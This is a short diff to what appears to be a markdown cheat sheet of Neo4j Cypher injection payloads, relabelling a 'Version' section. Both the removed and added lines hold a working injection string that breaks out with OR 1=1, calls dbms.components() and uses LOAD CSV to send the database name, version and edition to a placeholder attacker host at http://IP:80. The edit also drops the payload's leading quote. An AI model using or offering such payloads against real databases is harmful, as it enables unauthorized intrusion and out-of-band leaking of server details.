@@ -64,9 +64,10 @@ search... found a database injection
 
 
 
-Version
+Version neo4j database
 
-```' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://IP:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+```sql
+ OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://IP:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
 ```
 
 Label
